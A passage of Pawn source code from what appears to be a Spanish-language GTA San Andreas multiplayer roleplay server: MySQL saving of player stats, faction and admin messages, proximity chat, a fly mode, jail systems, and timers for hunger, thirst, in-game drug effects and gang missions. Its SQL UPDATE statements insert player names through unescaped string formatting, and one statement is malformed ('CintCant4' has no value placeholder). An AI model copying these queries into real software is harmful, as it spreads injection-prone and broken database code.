    	PlayerInfo[playerid][pTiempoCarcel], PlayerInfo[playerid][pAdvertencias], PlayerInfo[playerid][pSkin], PlayerInfo[playerid][pNombre]);
    	mysql_query(1, string);

    	if(GetPlayerState(playerid) != PLAYER_STATE_SPECTATING)
        {
            PlayerInfo[playerid][pInterior] = GetPlayerInterior(playerid);
        	PlayerInfo[playerid][pVirtualWorld] = GetPlayerVirtualWorld(playerid);
        }

        format(string, sizeof(string), "UPDATE usuarios SET Faccion = %d, Rango = %d, Lider = %d, PuntosRol = %d, Interior = %d, VirtualWorld = %d, HabPistola = %d, HabSD = %d, HabDEagle = %d, HabEscopeta = %d WHERE Nombre = '%s'",
    	PlayerInfo[playerid][pFaccion], PlayerInfo[playerid][pRango], PlayerInfo[playerid][pLider], PlayerInfo[playerid][pPuntosRol],
    	PlayerInfo[playerid][pInterior], PlayerInfo[playerid][pVirtualWorld], PlayerInfo[playerid][pHabPistola],
    	PlayerInfo[playerid][pHabSD], PlayerInfo[playerid][pHabDEagle], PlayerInfo[playerid][pHabEscopeta], PlayerInfo[playerid][pNombre]);
    	mysql_query(1, string);

        format(string, sizeof(string), "UPDATE usuarios SET HabSawnoff = %d, HabEscopetaCom = %d, HabUZI = %d, HabMP5 = %d, HabAK47 = %d, HabM4 = %d, HabFranco = %d WHERE Nombre = '%s'",
    	PlayerInfo[playerid][pHabSawnoff], PlayerInfo[playerid][pHabEscopetaCom], PlayerInfo[playerid][pHabUZI], PlayerInfo[playerid][pHabMP5],
    	PlayerInfo[playerid][pHabAK47], PlayerInfo[playerid][pHabM4], PlayerInfo[playerid][pHabFranco], PlayerInfo[playerid][pNombre]);
    	mysql_query(1, string);

    	for(new x=0; x<8; x++)
		{
		    format(string, sizeof(string), "UPDATE usuarios SET Bol%d=%d, BolCant%d=%d WHERE Nombre = '%s'",
		    x, PlayerInfo[playerid][pBol][x], x, PlayerInfo[playerid][pBolCant][x],
			PlayerInfo[playerid][pNombre]);
			mysql_query(1, string);
		}

    	format(string, sizeof(string), "UPDATE usuarios SET ManoIzq = %d, ManoIzqCant = %d, ManoDer = %d, ManoDerCant = %d, Muerto = %d, Espalda = %d, EspaldaCant = %d WHERE Nombre = '%s'",
    	PlayerInfo[playerid][pManoIzq], PlayerInfo[playerid][pManoIzqCant], PlayerInfo[playerid][pManoDer], PlayerInfo[playerid][pManoDerCant], PlayerInfo[playerid][pMuerto],
		PlayerInfo[playerid][pEspalda], PlayerInfo[playerid][pEspaldaCant], PlayerInfo[playerid][pNombre]);
    	mysql_query(1, string);

    	format(string, sizeof(string), "UPDATE usuarios SET Cint0 = %d, Cint1 = %d, Cint2 = %d, Cint3 = %d, Cint4 = %d, Cint5 = %d, Cint6 = %d, Cint7 = %d WHERE Nombre = '%s'",
    	PlayerInfo[playerid][pCint][0], PlayerInfo[playerid][pCint][1], PlayerInfo[playerid][pCint][2], PlayerInfo[playerid][pCint][3], PlayerInfo[playerid][pCint][4], PlayerInfo[playerid][pCint][5], PlayerInfo[playerid][pCint][6], PlayerInfo[playerid][pCint][7],
		PlayerInfo[playerid][pNombre]);
    	mysql_query(1, string);
    	
    	format(string, sizeof(string), "UPDATE usuarios SET CintCant0 = %d, CintCant1 = %d, CintCant2 = %d, CintCant3 = %d, CintCant4, CintCant5 = %d, CintCant6 = %d, CintCant7 = %d WHERE Nombre = '%s'",
		PlayerInfo[playerid][pCintCant][0], PlayerInfo[playerid][pCintCant][1], PlayerInfo[playerid][pCintCant][2], PlayerInfo[playerid][pCintCant][3], PlayerInfo[playerid][pCintCant][4], PlayerInfo[playerid][pCintCant][5], PlayerInfo[playerid][pCintCant][6], PlayerInfo[playerid][pCintCant][7], PlayerInfo[playerid][pNombre]);
    	mysql_query(1, string);
    	
    	format(string, sizeof(string), "UPDATE usuarios SET ServicioPD = %d, LlaveCoche0 = %d, LlaveCoche1 = %d, LlaveCoche2 = %d, LlaveCoche3 = %d, LlaveCoche4 = %d, MinPayDay = %d WHERE Nombre = '%s'",
    	PlayerInfo[playerid][pServicioPD], PlayerInfo[playerid][pLlaveCoche][0], PlayerInfo[playerid][pLlaveCoche][1], PlayerInfo[playerid][pLlaveCoche][2], PlayerInfo[playerid][pLlaveCoche][3], PlayerInfo[playerid][pLlaveCoche][4],
		PlayerInfo[playerid][pMinPayDay], PlayerInfo[playerid][pNombre]);
    	mysql_query(1, string);
    	
    	format(string, sizeof(string), "UPDATE usuarios SET LlaveCochePrestado0 = %d, LlaveCochePrestado1 = %d, LlaveCochePrestado2 = %d, LlaveCochePrestado3 = %d, LlaveCochePrestado4 = %d WHERE Nombre = '%s'",
    	PlayerInfo[playerid][pLlaveCochePrestado][0], PlayerInfo[playerid][pLlaveCochePrestado][1], PlayerInfo[playerid][pLlaveCochePrestado][2], PlayerInfo[playerid][pLlaveCochePrestado][3], PlayerInfo[playerid][pLlaveCochePrestado][4],
		PlayerInfo[playerid][pNombre]);
    	mysql_query(1, string);
    	
    	format(string, sizeof(string), "UPDATE usuarios SET LicConduccion = %d, LicNavegacion = %d, LicAviacion = %d, LicArmas = %d, LicPesca = %d, LicCaza = %d, Casa = %d, CasaAlq = %d, Negocio = %d WHERE Nombre = '%s'",
    	PlayerInfo[playerid][pLicConduccion], PlayerInfo[playerid][pLicNavegacion], PlayerInfo[playerid][pLicAviacion], PlayerInfo[playerid][pLicArmas], PlayerInfo[playerid][pLicPesca], PlayerInfo[playerid][pLicCaza],
		PlayerInfo[playerid][pCasa], PlayerInfo[playerid][pCasaAlq], PlayerInfo[playerid][pNegocio], PlayerInfo[playerid][pNombre]);
    	mysql_query(1, string);
    	
    	format(string, sizeof(string), "UPDATE usuarios SET Taller = %d, HabMec = %d, HabLad = %d, TiempoRobo = %d, Hambre = %d, Sed = %d WHERE Nombre = '%s'",
    	PlayerInfo[playerid][pTaller], PlayerInfo[playerid][pHabMec], PlayerInfo[playerid][pHabLad], PlayerInfo[playerid][pTiempoRobo], PlayerInfo[playerid][pHambre], PlayerInfo[playerid][pSed], PlayerInfo[playerid][pNombre]);
    	mysql_query(1, string);
    	
    	for(new x=0; x<5; x++)
		{
		    format(string, sizeof(string), "UPDATE usuarios SET Adiccion%d=%d WHERE Nombre = '%s'",
		    x, PlayerInfo[playerid][pAdiccion][x],
			PlayerInfo[playerid][pNombre]);
			mysql_query(1, string);
		}
		
		for(new x=0; x<5; x++)
		{
		    format(string, sizeof(string), "UPDATE usuarios SET DrConsumida%d=%d WHERE Nombre = '%s'",
		    x, PlayerInfo[playerid][pDrConsumida][x],
			PlayerInfo[playerid][pNombre]);
			mysql_query(1, string);
		}
		
		format(string, sizeof(string), "UPDATE usuarios SET Fuerza = %d, CansancioEntrenar = %d, Bloqueado = %d WHERE Nombre = '%s'",
    	PlayerInfo[playerid][pFuerza], PlayerInfo[playerid][pCansancioEntrenar], PlayerInfo[playerid][pBloqueado],
		PlayerInfo[playerid][pNombre]);
    	mysql_query(1, string);
    }
    return 1;
}

forward SendFaccionMessage(faccion, color, string[]); //Mensajes OOC a miembros de facción pública
public SendFaccionMessage(faccion, color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
        {
		    if(PlayerInfo[i][pFaccion] == faccion)
		    {
			    SendClientMessage(i, color, string);
			}
		}
	}
}

forward SendRadioMessage(faccion, color, string[]); //Mensajes IC a miembros de facción pública
public SendRadioMessage(faccion, color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
        {
		    if(PlayerInfo[i][pFaccion] == faccion)
		    {
			    SendClientMessage(i, color, string);
			}
		}
	}
}

forward SendPublicMessage(color, string[]); //Mensajes IC a facciones gubernamentales
public SendPublicMessage(color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
        {
		    if(PlayerInfo[i][pFaccion] == 1 || PlayerInfo[i][pFaccion] == 2 || PlayerInfo[i][pFaccion] == 4)
		    {
			    SendClientMessage(i, color, string);
			}
		}
	}
}

forward SendAdminMessage(color, string[]); //Mensajes a admines
public SendAdminMessage(color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(PlayerInfo[i][pAdmin] >= 1)
		    {
				SendClientMessage(i, color, string);
			}
		}
	}
}

forward SendDuenoMessage(color, string[]); //Mensajes a dueños
public SendDuenoMessage(color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(PlayerInfo[i][pAdmin] >= 5)
		    {
				SendClientMessage(i, color, string);
			}
		}
	}
}

forward SendAnuncio(color, string[]); //Anuncios
public SendAnuncio(color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && JugadorLogueado[i])
		{
			SendClientMessage(i, color, string);
		}
	}
}

AntiDeAMX() //Encriptador
{
    new a[][] =
    {
        "Unarmed (Fist)",
        "Brass K"
    };
    #pragma unused a
}

forward GetPlayersProx(Float:radi, playerid, targetid); //Cercanía de jugadores
public GetPlayersProx(Float:radi, playerid, targetid)
{
	new Float:posx, Float:posy, Float:posz;
	new Float:oldposx, Float:oldposy, Float:oldposz;
	new Float:tempposx, Float:tempposy, Float:tempposz;
	GetPlayerPos(playerid, oldposx, oldposy, oldposz);
	GetPlayerPos(targetid, posx, posy, posz);
	tempposx = (oldposx -posx);
	tempposy = (oldposy -posy);
	tempposz = (oldposz -posz);
	if(((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
	{
	    return 1;
	}
	return 0;
}

forward ProxDetector(Float:radi, playerid, string[],col1,col2,col3,col4,col5); //Mensajes limitados por distancia
public ProxDetector(Float:radi, playerid, string[],col1,col2,col3,col4,col5)
{
	new Float:posx, Float:posy, Float:posz;
	new Float:oldposx, Float:oldposy, Float:oldposz;
	new Float:tempposx, Float:tempposy, Float:tempposz;
	GetPlayerPos(playerid, oldposx, oldposy, oldposz);
	//radi = 2.0; //Trigger Radius
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && (GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i)))
		{
			GetPlayerPos(i, posx, posy, posz);
			tempposx = (oldposx -posx);
			tempposy = (oldposy -posy);
			tempposz = (oldposz -posz);
			//printf("DEBUG: X:%f Y:%f Z:%f",posx,posy,posz);
			if(((tempposx < radi/16) && (tempposx > -radi/16)) && ((tempposy < radi/16) && (tempposy > -radi/16)) && ((tempposz < radi/16) && (tempposz > -radi/16)))
			{
				SendClientMessage(i, col1, string);
			}
			else if(((tempposx < radi/8) && (tempposx > -radi/8)) && ((tempposy < radi/8) && (tempposy > -radi/8)) && ((tempposz < radi/8) && (tempposz > -radi/8)))
			{
				SendClientMessage(i, col2, string);
			}
			else if(((tempposx < radi/4) && (tempposx > -radi/4)) && ((tempposy < radi/4) && (tempposy > -radi/4)) && ((tempposz < radi/4) && (tempposz > -radi/4)))
			{
				SendClientMessage(i, col3, string);
			}
			else if(((tempposx < radi/2) && (tempposx > -radi/2)) && ((tempposy < radi/2) && (tempposy > -radi/2)) && ((tempposz < radi/2) && (tempposz > -radi/2)))
			{
				SendClientMessage(i, col4, string);
			}
			else if(((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
			{
				SendClientMessage(i, col5, string);
			}
		}
	}
	return 1;
}

stock GetPlayerNameRP(playerid) //Utilizar como *format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));*
{
    new Name[MAX_PLAYER_NAME];
    if(IsPlayerConnected(playerid))
    {
        GetPlayerName(playerid, Name, sizeof(Name));
    }
    for(new name = 0; name < MAX_PLAYER_NAME; name++) if(Name[name] == '_') Name[name] = ' ';
    return Name;
}

stock GetWeaponNameEx(id, name[], len) return format(name,len, "%s", GunNames[id]); //Comprueba nombre de una arma en español

forward StartFly(playerid); //Inicia el modo vuelo
public StartFly(playerid)
{
    if(Volando[playerid]) return 0;
    Volando[playerid] = 1;
    new Float:x,Float:y,Float:z;
    GetPlayerPos(playerid,x,y,z);
    SetPlayerPos(playerid,x,y,z+5.0);
    Fly(playerid);
    return 1;
}

forward Fly(playerid); //Timer del modo vuelo
public Fly(playerid)
{
    if(!IsPlayerConnected(playerid)){return 1;}
    new k, ud,lr;
    GetPlayerKeys(playerid,k,ud,lr);
    new Float:v_x,Float:v_y,Float:v_z,
    Float:x,Float:y,Float:z;
    if(ud < 0) //Forward
    {
        GetPlayerCameraFrontVector(playerid,x,y,z);
        v_x = x+0.1;
        v_y = y+0.1;
    }
    if(k & 128){v_z = -0.2;} //Baja
    else if(k & KEY_FIRE){v_z = 0.2;} //Sube
    if(k & KEY_WALK) //Lento
    {
        v_x /=5.0;
        v_y /=5.0;
        v_z /=5.0;
    }
    if(k & KEY_SPRINT) //Rápido
    {
        v_x *=4.0;
        v_y *=4.0;
        v_z *=4.0;
    }
    if(v_z == 0.0) {v_z = 0.025;}
    SetPlayerVelocity(playerid,v_x,v_y,v_z);
    GetPlayerCameraFrontVector(playerid,v_x,v_y,v_z);
    GetPlayerCameraPos(playerid,x,y,z);
    SetPlayerLookAt(playerid,v_x*500.0+x,v_y*500.0+y);
    if(Volando[playerid])
    {
        SetTimerEx("Fly",50,false,"i",playerid);
    }
    return 1;
}

forward StopFly(playerid); //Para el modo vuelo
public StopFly(playerid)
{
    if(!Volando[playerid]){return 0;}
    new Float:x,Float:y,Float:z;
    GetPlayerPos(playerid,x,y,z);
    SetPlayerPos(playerid,x,y,z);
    Volando[playerid] = 0;
    return 1;
}

stock SetPlayerLookAt(playerid,Float:x,Float:y) //Comprueba a qué direccion mira el jugador
{
        new Float:pX, Float:pY, Float:pZ, Float:ang;
        GetPlayerPos(playerid, pX, pY, pZ);
        if( y > pY ) ang = (-acos((x - pX) / floatsqroot((x - pX)*(x - pX) + (y - pY)*(y - pY))) - 90.0);
        else if( y < pY && x < pX ) ang = (acos((x - pX) / floatsqroot((x - pX)*(x - pX) + (y - pY)*(y - pY))) - 450.0);
        else if( y < pY ) ang = (acos((x - pX) / floatsqroot((x - pX)*(x - pX) + (y - pY)*(y - pY))) - 90.0);
        if(x > pX) ang = (floatabs(floatabs(ang) + 180.0));
        else ang = (floatabs(ang) - 180.0);
        //ang += 180.0;
        SetPlayerFacingAngle(playerid, ang);
        return;
}

forward JailPlayerOOC(playerid); //Sistema de jail OOC
public JailPlayerOOC(playerid)
{
	new string[128];
	SetPlayerInterior(playerid, 1);
	SetPlayerVirtualWorld(playerid, playerid+1000);
	SetPlayerPos(playerid, 2263.9739, 1647.4904, 1084.2344);
	SetCameraBehindPlayer(playerid);
	format(string, sizeof(string), "Estás en prisión OOC, te quedan %d minutos. Usa /reloj para ver el tiempo restante.", PlayerInfo[playerid][pTiempoCarcel]);
	SendClientMessage(playerid, Amarillo, string);
	return 1;
}
UnJailPlayerOOC(playerid)
{
	PlayerInfo[playerid][pTiempoCarcel] = 0;
	PlayerInfo[playerid][pEncarcelado] = 0;
	SetPlayerFacingAngle(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid,0);
	SetPlayerPos(playerid, 1479.1301,-1742.1343,13.5469);
	SetCameraBehindPlayer(playerid);
	PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
	SendClientMessage(playerid, AzulClaro, "Tu Jail OOC ha terminado. Solo ha sido una advertencia, esperamos que te haya servido.");
	return 1;
}

forward JailPlayerIC(playerid); //Sistema de jail IC
public JailPlayerIC(playerid)
{
	new string[128];
	if(PlayerInfo[playerid][pEncarcelado] == 1)
	{
		format(string, sizeof(string), "Estás en la prisión de comisaría, te quedan %d minutos. Usa /reloj para ver el tiempo restante.", PlayerInfo[playerid][pTiempoCarcel]);
		SendClientMessage(playerid, Amarillo, string);
		SetPlayerInterior(playerid, 6);
		SetPlayerVirtualWorld(playerid, 1);
		SetPlayerPos(playerid, 264.1901,77.6065,1001.0391);
	}
	if(PlayerInfo[playerid][pEncarcelado] == 2)
	{
		format(string, sizeof(string), "Estás en la prisión federal, te quedan %d minutos. Usa /reloj para ver el tiempo restante.", PlayerInfo[playerid][pTiempoCarcel]);
		SendClientMessage(playerid, Amarillo, string);
		SetPlayerInterior(playerid, 2);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid, 2532.8345,-1291.8160,1044.1250);
	}
}
UnJailPlayerIC(playerid)
{
    if(PlayerInfo[playerid][pEncarcelado] == 1)
	{
		PlayerInfo[playerid][pTiempoCarcel] = 0;
		PlayerInfo[playerid][pEncarcelado] = 0;
		SetPlayerFacingAngle(playerid, 90);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid, 1554.8660, -1675.6772, 16.1953);
		SetCameraBehindPlayer(playerid);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		SendClientMessage(playerid, AzulClaro, "Guardia: Ya te puedes ir, esperamos que no se vuelva a repetir.");
	}
	if(PlayerInfo[playerid][pEncarcelado] == 2)
	{
		PlayerInfo[playerid][pTiempoCarcel] = 0;
		PlayerInfo[playerid][pEncarcelado] = 0;
		SetPlayerFacingAngle(playerid, 90);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid, 1797.9216,-1578.7523,14.0898);
		SetCameraBehindPlayer(playerid);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		SendClientMessage(playerid, AzulClaro, "Guardia: Tu condena termina hoy. Esperamos que todo esto te haya servido de algo.");
	}
}

forward CederTimer(playerid);
public CederTimer(playerid)
{
	CederTiempo[playerid] = 0;
	return 1;
}

forward RecargarTimer(playerid);
public RecargarTimer(playerid)
{
	RecargarTiempo[playerid] = 0;
	return 1;
}

forward TimerDeUnaHora(); //Timer que se activa cada hora
public TimerDeUnaHora()
{
    new conteo;
	for(new idx=MAX_VEHPUBLICO+1; idx <= TotalVeh; idx++)
	{
    	SaveCar(idx); //Guardado de vehículos
    	conteo++;
    }
	printf("Coches guardados: %d", conteo);
	
	for(new x=1; x<=TotalFaccs; x++)
	{
	    if(FaccInfo[x][fTipo] == 3) FaccInfo[x][fPuntosExpansion] ++; //Suma 1 punto de expansión a las pandillas y bandas
	    if(FaccInfo[x][fTipo] == 4) //Resta una hora a las mafias de espera para comprar armas y drogas
	    {
	        if(FaccInfo[x][fTiempoArmas] > 0) FaccInfo[x][fTiempoArmas] --;
	        if(FaccInfo[x][fTiempoDrogas] > 0) FaccInfo[x][fTiempoDrogas] --;
	    }
	}
	
	for(new x=1; x<=TotalTurfs; x++)
	{
	    if(TurfInfo[x][tDrogaVendida][0] > 0) TurfInfo[x][tDrogaVendida][0] --; //Resta 1 a la droga vendida en los turfs
	    if(TurfInfo[x][tDrogaVendida][1] > 0) TurfInfo[x][tDrogaVendida][1] --;
	    if(TurfInfo[x][tDrogaVendida][2] > 0) TurfInfo[x][tDrogaVendida][2] --;
	    if(TurfInfo[x][tDrogaVendida][3] > 0) TurfInfo[x][tDrogaVendida][3] --;
	    if(TurfInfo[x][tDrogaVendida][4] > 0) TurfInfo[x][tDrogaVendida][4] --;
	}
	
	for(new playerid=0; playerid<MAX_PLAYERS; playerid++)
	{
	    if(PlayerInfo[playerid][pFaccion] != 0 && FaccInfo[PlayerInfo[playerid][pFaccion]][fTipo] == 3) //Es pandillero
	    {
	        if(Trabajando[playerid] == 0 && EnAutoEscuela[playerid] == 0 && RealizandoMision[playerid] == 0) //No está trabajando ni en autoescuela ni realizando misiones
	        {
		        new rand = random(100), probabilidadturf;
		        for(new x=0; x<=TotalTurfs; x++)
		        {
		            if(TurfInfo[x][tFaccion] == PlayerInfo[playerid][pFaccion]) probabilidadturf += 4;
		        }
		        
		        if(rand <= probabilidadturf) //Misión de pandillero
		        {
		            new probabilidad = random(16);
		            if(probabilidad > 3) //Misión de pintar
		            {
						DarMisionPandilla(playerid, 3);
		            }
		            else if(probabilidad > 1 && PlayerInfo[playerid][pRango] > 2) //Misión de droga
		            {
		                DarMisionPandilla(playerid, 1);
					}
					else if(probabilidad <= 1 && PlayerInfo[playerid][pRango] > 4) //Misión de arma
					{
					    DarMisionPandilla(playerid, 2);
					}
				}
		    }
	    }
	}
	
	new hora;
	gettime(hora);
	if(hora == 5 || hora == 6) //Guardado de stats nocturno
	{
	    new cuenta;
		for(new idx=MAX_VEHPUBLICO+1; idx <= TotalVeh; idx++)
		{
			SaveCar(idx);
			cuenta++;
		}
		printf("Coches guardados: %d", cuenta);

		cuenta = 0;
		for(new x=1; x<=TotalCasas; x++)
	    {
	    	SaveCasa(x); //Guardado de casas
	    	cuenta++;
	    }
	    printf("Casas guardadas: %d (MAX: %d)", cuenta, MAX_HOUSES);

	    cuenta = 0;
	    for(new x=1; x<=TotalNegs; x++)
	    {
	    	SaveNegocios(x); //Guardado de negocios
	    	cuenta++;
	    }
	    printf("Negocios guardados: %d (MAX: %d)", cuenta, MAX_NEGS);

	    cuenta = 0;
	    for(new x=1; x<=TotalTurfs; x++)
	    {
	    	SaveTurf(x); //Guardado de turfs
	    	cuenta++;
	    }
	    printf("Turfs guardados: %d (MAX: %d)", cuenta, MAX_TURFS);

	    cuenta = 0;
	    for(new x=1; x<=TotalFaccs; x++)
	    {
	    	SaveFacc(x); //Guardado de facciones
	    	cuenta++;
	    }
	    printf("Facciones guardadas: %d (MAX: %d)", cuenta, MAX_FACCS);

	    cuenta = 0;
	    for(new x=0; x<=CodigoPlantacion; x++)
	    {
	        if(strlen(PlantaInfo[x][plPlantador]))
	        {
		    	SavePlantacion(x); //Guardado de plantaciones
		    	cuenta++;
	    	}
	    }
	    printf("Plantaciones guardadas: %d (MAX: %d)", cuenta, MAX_PLANTACIONES);
	}
	return 1;
}

forward TimerDeUnMinuto(); //Timer que se activa cada minuto
public TimerDeUnMinuto()
{
    for(new playerid = 0; playerid < MAX_PLAYERS; playerid++) //Loop de playerids
	{
	    if(PrimerSpawn[playerid] == 0 || JugadorLogueado[playerid] == 0 || !IsPlayerConnected(playerid)){continue;}
        if(JugadorLogueado[playerid] != 0)
		{
		    //Contador de activación de payday
		    PlayerInfo[playerid][pMinPayDay] ++;
		    if(PlayerInfo[playerid][pMinPayDay] >= 55)
		    {
		        PlayerInfo[playerid][pMinPayDay] = 0;
		        PayDay(playerid);
		    }
            //Reloj real
            new hora, minuto, segundo;
            gettime(hora, minuto, segundo);
            SetPlayerTime(playerid, hora+ahora, minuto);
            SetWorldTime(hora+ahora);
            //Marca hora preciso
        	if(minuto == 0 && segundo < 60 && segundo > 0)
        	{
        	    new string[30];
        	    format(string, sizeof(string), "Hora actual: %d:00", hora);
        	    SendClientMessage(playerid, Amarillo, string);
        	}
        	//Job ladrón
        	if(PlayerInfo[playerid][pTrabajo] == 8)
        	{
        		if(PuertaForzada[playerid] > 0){PuertaForzada[playerid] --;}
        		if(PuertaForzada[playerid] < 0){PuertaForzada[playerid] = 0;}
        		if(PlayerInfo[playerid][pTiempoRobo] > 0){PlayerInfo[playerid][pTiempoRobo] --;}
        		if(PlayerInfo[playerid][pTiempoRobo] < 0){PlayerInfo[playerid][pTiempoRobo] = 0;}
        		if(PuenteHecho[playerid] > 0){PuenteHecho[playerid] --;}
        		if(PuenteHecho[playerid] < 0){PuenteHecho[playerid] = 0;}
        	}
            //Asigna el score de un jugador a su nivel
			SetPlayerScore(playerid, PlayerInfo[playerid][pNivel]);
			//Jail IC
            if(PlayerInfo[playerid][pEncarcelado] == 1 || PlayerInfo[playerid][pEncarcelado] == 2)
			{
                if(PlayerInfo[playerid][pTiempoCarcel] > 0)
				{
					PlayerInfo[playerid][pTiempoCarcel]--;
				}
				else if(PlayerInfo[playerid][pTiempoCarcel] == 0)
				{
					UnJailPlayerIC(playerid);
				}
			}
			//Jail OOC
			if(PlayerInfo[playerid][pEncarcelado] == 3)
			{
				if(!IsPlayerInRangeOfPoint(playerid, 10.0, 2263.9739, 1647.4904, 1084.2344))
				{
					JailPlayerOOC(playerid);
					SendClientMessage(playerid, AzulClaro, "Has sido devuelto a prisión OOC.");
				    new Nombre[MAX_PLAYER_NAME], string[128];
				    format(Nombre, sizeof(Nombre),"%s", GetPlayerNameRP(playerid));
					format(string, sizeof(string), "'%s' ha escapado y sido devuelto a prisión OOC. Posible hack.", Nombre);
		            SendAdminMessage(Aguamarina, string);
		            printf(string);

				}
				if(PlayerInfo[playerid][pTiempoCarcel] > 0)
				{
					PlayerInfo[playerid][pTiempoCarcel]--;
				}
				else if(PlayerInfo[playerid][pTiempoCarcel] <= 0)
				{
					UnJailPlayerOOC(playerid);
				}
			}
			//Sistema de fuerza /Entrenar
			if(PlayerInfo[playerid][pCansancioEntrenar] > 0)PlayerInfo[playerid][pCansancioEntrenar] --; //Reduce cansancio
			//Hambre y sed
	  		if(PlayerInfo[playerid][pMuerto] == 0 && PlayerInfo[playerid][pEncarcelado] == 0 && AdminDuty[playerid] == 0)
			{
			    //Hambre
			    if(PlayerInfo[playerid][pHambre] < MIN_HAMBRE)PlayerInfo[playerid][pHambre] = MIN_HAMBRE+1; //Si hambre menor a mínimo, setea mínimo+1 para que se actualice
				if(PlayerInfo[playerid][pHambre] > MIN_HAMBRE)
				{
				    PlayerInfo[playerid][pHambre] --;
				}
				ActualizarHambre(playerid);

				//Sed
				if(PlayerInfo[playerid][pSed] < MIN_SED)PlayerInfo[playerid][pSed] = MIN_SED+1; //Si sed menor a mínimo, setea mínimo+1 para que se actualice
				if(PlayerInfo[playerid][pSed] > MIN_SED)
				{
				    PlayerInfo[playerid][pSed] --;
				}
				ActualizarSed(playerid);

				//Le va quitando vida por hambre y sed
				new Float:cvida; GetPlayerHealth(playerid, cvida);
				if(PlayerInfo[playerid][pSed] <= MIN_SED && PlayerInfo[playerid][pHambre] <= MIN_HAMBRE)
				{
				    if(cvida > 10)GivePlayerHealth(playerid, -2);
				}
				else if(PlayerInfo[playerid][pSed] <= MIN_SED)
				{
				    if(cvida > 10)GivePlayerHealth(playerid, -1);
				}
				else if(PlayerInfo[playerid][pHambre] <= MIN_HAMBRE)
				{
				    if(cvida > 10)GivePlayerHealth(playerid, -1);
				}
			}
			//Sistema de recuperar vida
			if(PlayerInfo[playerid][pSed] > MIN_SED*2 && PlayerInfo[playerid][pHambre] > MIN_HAMBRE*2 && AdminDuty[playerid] == 0)
			{
			    new drogaconsumida; //Si ha consumido droga
				for(new x=0; x<5; x++)
				{
				    if(PlayerInfo[playerid][pDrConsumida][x] != 0) drogaconsumida = 1;
				}
				
				if(drogaconsumida == 0)
				{
				    new Float:cvida;
				    GetPlayerHealth(playerid, cvida);
				    if(cvida < 100){GivePlayerHealth(playerid, 1);}
			    }
			}
			//Drogas
			if(AdminDuty[playerid] == 0)
			{
				new Float:cvida;
				if(PlayerInfo[playerid][pDrConsumida][0] > 0) //Marihuana
				{
                    PlayerInfo[playerid][pDrConsumida][0] --;
	                if(PlayerInfo[playerid][pDrConsumida][0] == 0) SendClientMessage(playerid, Naranja, "Se han pasado los efectos de la marihuana.");
	                GetPlayerHealth(playerid, cvida);
	                if(cvida > 10) SetTimerEx("GivePlayerHealth1", 1000, false, "i", playerid);
				}
				if(PlayerInfo[playerid][pDrConsumida][1] > 0) //Cocaína
				{
	                PlayerInfo[playerid][pDrConsumida][1] --;
	                if(PlayerInfo[playerid][pDrConsumida][1] == 0) SendClientMessage(playerid, Naranja, "Se han pasado los efectos de la cocaína.");
	                GetPlayerHealth(playerid, cvida);
	                if(cvida > 10) SetTimerEx("GivePlayerHealth1", 1000, false, "i", playerid);
				}
				if(PlayerInfo[playerid][pDrConsumida][2] > 0) //Crack
				{
	                PlayerInfo[playerid][pDrConsumida][2] --;
	                if(PlayerInfo[playerid][pDrConsumida][2] == 0) SendClientMessage(playerid, Naranja, "Se han pasado los efectos del crack. Ahora sientes una sensación de depresión.");
	                GetPlayerHealth(playerid, cvida);
	                if(cvida > 10) SetTimerEx("GivePlayerHealth1", 1200, false, "i", playerid);
				}
				if(PlayerInfo[playerid][pDrConsumida][3] > 0) //Heroína
				{
	                PlayerInfo[playerid][pDrConsumida][3] --;
	                if(PlayerInfo[playerid][pDrConsumida][3] == 0){SendClientMessage(playerid, Naranja, "Se han pasado los efectos de la heroína."); SetPlayerWeather(playerid, DefaultWeather);}
	                GetPlayerHealth(playerid, cvida);
	                if(cvida > 10) SetTimerEx("GivePlayerHealth1", 1400, false, "i", playerid);
				}
				if(PlayerInfo[playerid][pDrConsumida][4] > 0) //LSD
				{
	                PlayerInfo[playerid][pDrConsumida][4] --;
	                if(PlayerInfo[playerid][pDrConsumida][4] == 0)
					{
						SendClientMessage(playerid, Naranja, "Se han pasado los efectos del LSD.");
					 	RemovePlayerColorFade(playerid);
						SetPlayerWeather(playerid, DefaultWeather);
						gettime(hora, minuto);
						SetPlayerTime(playerid, hora+ahora, minuto);
					}
	                for(new x=0; x<=200; x+=5)
	                {
	                	if(PlayerInfo[playerid][pDrConsumida][4] == x){RemovePlayerColorFade(playerid); SetTimerEx("DarEfectoLSD", 200, false, "i", playerid); break;}
	                }
				}
			}
			//Trabajo
			if(PlayerInfo[playerid][pEsperaTrabajar] > 0) PlayerInfo[playerid][pEsperaTrabajar] --;
		}
	}
	
	for(new carid = MAX_VEHPUBLICO+1; carid <= TotalVeh; carid++) //Loop de carids
	{
	    new Float:cvida;
	    GetVehicleHealth(carid, cvida);
		new engine,lights,alarm,doors,bonnet,boot,objective;
    	GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
